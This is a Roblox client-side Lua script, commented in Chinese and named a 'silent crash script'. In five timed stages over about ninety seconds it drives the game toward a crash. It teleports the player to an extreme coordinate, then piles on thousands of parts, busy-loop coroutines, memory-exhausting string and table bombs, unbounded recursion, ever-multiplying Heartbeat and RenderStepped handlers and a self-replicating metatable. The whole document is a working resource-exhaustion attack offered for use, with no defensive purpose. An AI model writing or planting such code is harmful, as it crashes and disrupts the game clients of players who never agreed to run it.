-- 无声崩溃脚本 - 本地脚本
-- 将此脚本放在StarterPlayerScripts中

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- 立即将玩家传送到最远位置
local function teleportToEdge()
    local maxPosition = Vector3.new(999999, 999999, 999999)
    
    if character and character:FindFirstChild("HumanoidRootPart") then
        character.HumanoidRootPart.CFrame = CFrame.new(maxPosition)
    else
        player.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = CFrame.new(maxPosition)
    end
end

-- 阶段1：轻微卡顿（0-10秒）
local function phase1()
    local parts = {}
    for i = 1, 100 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(5, 5, 5)
        part.Position = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
        part.Anchored = true
        part.Parent = workspace
        
        table.insert(parts, part)
        
        if i % 10 == 0 then
            local light = Instance.new("PointLight", part)
            light.Range = 50
            light.Brightness = 1
        end
    end
    
    local calculations = {}
    for i = 1, 5 do
        coroutine.wrap(function()
            while true do
                local result = 0
                for j = 1, 10000 do
                    result = result + math.sin(j) * math.cos(j)
                end
                table.insert(calculations, result)
                task.wait(0.1)
            end
        end)()
    end
    
    return {parts = parts, calculations = calculations}
end

-- 阶段2：明显卡顿（10-30秒）
local function phase2()
    local meshes = {}
    for i = 1, 200 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(10, 10, 10)
        part.Position = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
        part.Anchored = true
        part.Parent = workspace
        
        local mesh = Instance.new("SpecialMesh", part)
        mesh.MeshType = Enum.MeshType.Head
        mesh.Scale = Vector3.new(2, 2, 2)
        table.insert(meshes, mesh)
        
        if i % 20 == 0 then
            local bodyForce = Instance.new("BodyForce", part)
            bodyForce.Force = Vector3.new(0, 1000, 0)
        end
    end
    
    local heavyCalculations = {}
    for i = 1, 10 do
        coroutine.wrap(function()
            while true do
                local total = 0
                for j = 1, 50000 do
                    total = total + math.atan(j) * math.exp(math.sin(j)) * math.log(j + 1)
                end
                table.insert(heavyCalculations, total)
                
                local strData = ""
                for k = 1, 1000 do
                    strData = strData .. tostring(total) .. tostring(math.random(1, 1000))
                end
                table.insert(heavyCalculations, strData)
                
                task.wait(0.05)
            end
        end)()
    end
    
    return {meshes = meshes, heavyCalculations = heavyCalculations}
end

-- 阶段3：严重卡顿（30-60秒）
local function phase3()
    local allObjects = {}
    for i = 1, 500 do
        coroutine.wrap(function()
            for j = 1, 50 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(math.random(1, 20), math.random(1, 20), math.random(1, 20))
                part.Position = Vector3.new(
                    math.random(-2000, 2000),
                    math.random(-2000, 2000),
                    math.random(-2000, 2000)
                )
                part.Anchored = true
                part.Parent = workspace
                
                for k = 1, 5 do
                    local child = Instance.new("Part", part)
                    child.Size = Vector3.new(2, 2, 2)
                    local weld = Instance.new("Weld", child)
                    weld.Part0 = part
                    weld.Part1 = child
                end
                
                table.insert(allObjects, part)
                task.wait(0.01)
            end
        end)()
    end
    
    local memoryData = {}
    coroutine.wrap(function()
        while true do
            local dataChunk = {}
            for i = 1, 10000 do
                dataChunk[i] = string.rep("DATA" .. tostring(i), 10)
            end
            table.insert(memoryData, dataChunk)
            
            if #memoryData > 100 then
                for i = 1, 20 do
                    table.remove(memoryData, 1)
                end
            end
            
            task.wait(0.5)
        end
    end)()
    
    local connections = {}
    for i = 1, 100 do
        local conn = RunService.RenderStepped:Connect(function()
            local temp = 0
            for j = 1, 1000 do
                temp = temp + math.sin(temp) * math.cos(temp)
            end
        end)
        table.insert(connections, conn)
    end
    
    return {allObjects = allObjects, memoryData = memoryData, connections = connections}
end

-- 阶段4：即将崩溃（60-90秒）
local function phase4()
    local explosionObjects = {}
    
    coroutine.wrap(function()
        while true do
            for i = 1, 100 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(50, 50, 50)
                part.Position = Vector3.new(
                    math.random(-5000, 5000),
                    math.random(-5000, 5000),
                    math.random(-5000, 5000)
                )
                part.Anchored = true
                part.Parent = workspace
                
                for attr = 1, 20 do
                    pcall(function()
                        part:SetAttribute("Attribute" .. tostring(attr), string.rep("VALUE", 100))
                    end)
                end
                
                table.insert(explosionObjects, part)
            end
            task.wait(0.02)
        end
    end)()
    
    local stringBombs = {}
    for i = 1, 20 do
        coroutine.wrap(function()
            local str = "初始字符串"
            while true do
                for j = 1, 100 do
                    str = str .. string.rep("附加数据" .. tostring(math.random(1, 1000)), 10)
                end
                table.insert(stringBombs, str)
                
                if #stringBombs > 500 then
                    for k = 1, 100 do
                        table.remove(stringBombs, 1)
                    end
                end
                
                task.wait(0.1)
            end
        end)()
    end
    
    local function limitedRecursion(depth, maxDepth)
        if depth > maxDepth then
            return depth
        end
        
        local result = 0
        for i = 1, 1000 do
            result = result + math.tan(depth + i) * math.atan(depth + i)
        end
        
        local tempData = {}
        for j = 1, 100 do
            tempData[j] = string.rep("递归数据" .. tostring(depth), 10)
        end
        
        return limitedRecursion(depth + 1, maxDepth) + result
    end
    
    for i = 1, 10 do
        coroutine.wrap(function()
            while true do
                pcall(function()
                    limitedRecursion(1, 100)
                end)
                task.wait(1)
            end
        end)()
    end
    
    return {explosionObjects = explosionObjects, stringBombs = stringBombs}
end

-- 阶段5：最终崩溃（90秒后）
local function phase5()
    coroutine.wrap(function()
        local memoryBomb = {}
        while true do
            local hugeArray = {}
            for i = 1, 100000 do
                hugeArray[i] = string.rep("最终阶段内存数据" .. tostring(i), 100)
            end
            table.insert(memoryBomb, hugeArray)
            
            task.wait(0.1)
        end
    end)()
    
    coroutine.wrap(function()
        local function infiniteRecursion(level)
            local data = {}
            for i = 1, 1000 do
                data[i] = string.rep("递归级别" .. tostring(level), 100)
            end
            
            coroutine.wrap(function()
                infiniteRecursion(level + 1)
            end)()
            
            return infiniteRecursion(level + 1)
        end
        
        pcall(function()
            infiniteRecursion(1)
        end)
    end)()
    
    coroutine.wrap(function()
        while true do
            for i = 1, 100 do
                RunService.Heartbeat:Connect(function()
                    local result = 0
                    for j = 1, 10000 do
                        result = result + math.sin(result) * math.cos(result) * math.exp(math.sin(result))
                    end
                    
                    local moreData = {}
                    for k = 1, 100 do
                        moreData[k] = Vector3.new(result, result, result)
                    end
                end)
            end
            task.wait(0.01)
        end
    end)()
    
    coroutine.wrap(function()
        pcall(function()
            local t = {}
            local mt = {}
            
            mt.__index = function(self, key)
                local newTable = {}
                for i = 1, 1000 do
                    newTable[i] = string.rep(key, 1000)
                end
                setmetatable(newTable, mt)
                return newTable
            end
            
            setmetatable(t, mt)
            
            local _ = t.someKey
        end)
    end)()
end

-- 主控制函数
local function startProgressiveCrash()
    teleportToEdge()
    
    local phase1Data = phase1()
    
    task.wait(10)
    
    local phase2Data = phase2()
    
    task.wait(20)
    
    local phase3Data = phase3()
    
    task.wait(30)
    
    local phase4Data = phase4()
    
    task.wait(30)
    
    phase5()
end

-- 启动脚本
startProgressiveCrash()
